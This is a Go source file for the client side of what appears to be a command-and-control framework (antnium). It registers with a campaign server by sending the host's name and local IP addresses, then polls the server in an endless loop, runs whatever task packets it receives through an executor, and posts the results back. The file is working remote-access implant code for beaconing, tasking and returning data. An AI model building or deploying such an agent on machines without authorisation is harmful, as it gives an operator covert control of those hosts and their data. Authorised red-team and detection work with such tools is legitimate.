package client

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"

	"github.com/dobin/antnium/executor"
	"github.com/dobin/antnium/model"
	log "github.com/sirupsen/logrus"
)

var ErrNoPacketsFound = errors.New("Server did not return any packets")

type Client struct {
	Config   ClientConfig
	Campaign model.Campaign
	coder    model.Coder
	state    ClientState

	packetExecutor executor.PacketExecutor
}

func NewClient() Client {
	config := MakeClientConfig()
	campaign := model.MakeCampaign()
	coder := model.MakeCoder(campaign)

	w := Client{
		config,
		campaign,
		coder,
		MakeClientState(),
		executor.MakePacketExecutor(),
	}
	return w
}

func (s *Client) PacketGetUrl() string {
	return s.Campaign.ServerUrl + s.Campaign.PacketGetPath + s.Config.ComputerId
}

func (s *Client) PacketSendUrl() string {
	return s.Campaign.ServerUrl + s.Campaign.PacketSendPath
}

func (s *Client) HttpGet(url string) (*http.Response, error) {
	client := &http.Client{}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("X-Session-Token", s.Campaign.ApiKey)
	res, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	return res, nil
}

func (s *Client) HttpPost(url string, data *bytes.Reader) (*http.Response, error) {
	client := &http.Client{}
	req, err := http.NewRequest("POST", url, data)
	if err != nil {
		return nil, err
	}
	req.Header.Set("X-Session-Token", s.Campaign.ApiKey)
	res, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	return res, nil
}

func (s *Client) Start() {
	s.sendPing()
	for {
		gotPacket := s.requestAndExecute()
		sleepDuration := s.state.getSleepDuration(gotPacket)
		time.Sleep(sleepDuration)
	}
}

func (s *Client) sendPing() {
	arguments := make(model.PacketArgument)
	response := make(model.PacketResponse)

	response["hostname"] = s.Config.Hostname
	model.AddArrayToResponse("localIp", s.Config.LocalIps, response)

	packet := model.NewPacket("ping", s.Config.ComputerId, "0", arguments, response)
	s.sendPacket(packet)
}

func (s *Client) requestAndExecute() bool {
	packet, err := s.GetPacket()
	if err != nil {
		if err == ErrNoPacketsFound {
			fmt.Print(".")
			return false // no news, sleep
		}

		log.WithFields(log.Fields{
			"error": err,
		}).Debug("Error get packet")
		return false // if there is a broken packet on server, dont flood him
	}

	err = s.packetExecutor.Execute(&packet)
	if err != nil {
		log.WithFields(log.Fields{
			"packet": packet,
			"error":  err,
		}).Info("Error executing packet")
		return true // we still got a packet
	}

	err = s.sendPacket(packet)
	if err != nil {
		log.WithFields(log.Fields{
			"packet": packet,
			"error":  err,
		}).Info("Error sending packet")
		return true // we still got a packet
	}
	return true // got a packet
}

func (s *Client) GetPacket() (model.Packet, error) {
	url := s.PacketGetUrl()
	resp, err := s.HttpGet(url)
	if err != nil {
		return model.Packet{}, fmt.Errorf("Error requesting URL %s with error %s", url, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return model.Packet{}, fmt.Errorf("Error status code %d in requesting URL %s", resp.StatusCode, url)
	}
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return model.Packet{}, fmt.Errorf("Error reading body of URL %s with error %s", url, err)
	}

	if len(bodyBytes) <= 0 {
		return model.Packet{}, ErrNoPacketsFound
	}
	packet, err := s.coder.DecodeData(bodyBytes)
	if err != nil {
		return model.Packet{}, fmt.Errorf("Error decoding body of URL %s with error %s", url, err)
	}
	return packet, nil
}

func (s *Client) sendPacket(packet model.Packet) error {
	url := s.PacketSendUrl()

	// Setup response
	packet.ComputerId = s.Config.ComputerId
	json, err := json.Marshal(packet)
	if err != nil {
		return err
	}

	log.WithFields(log.Fields{
		"packet": string(json),
	}).Info("Send Packet")

	data, err := s.coder.EncodeData(packet)
	if err != nil {
		return fmt.Errorf("Could not send answer to URL %s: %s", url, err.Error())
	}

	resp, err := s.HttpPost(url, bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("Could not send answer to URL %s: %s", url, err.Error())
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("Error status code %d in requesting URL %s", resp.StatusCode, url)
	}

	return nil
}
